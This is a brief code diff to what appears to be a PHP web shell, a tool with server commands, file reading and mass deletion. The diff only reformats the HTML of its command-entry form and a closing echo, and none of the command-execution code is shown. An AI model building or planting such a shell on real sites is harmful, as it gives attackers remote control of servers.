@@ -557,10 +557,10 @@ function massdelete($dir, $filename) {
 
 function tools($toolsname, $args = null) {
 	if($toolsname === "cmd") {
-		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
+		print "<br><form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
 			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
 			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
-			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
+			  <input type='submit' value=' >> '>
 			  </form>";
 	}
 	elseif($toolsname === "readfile") {
@@ -1768,4 +1768,5 @@ function action() {
 serverinfo();
 action();
 
-echo "</body></html>";
+echo"</body></html>";
+
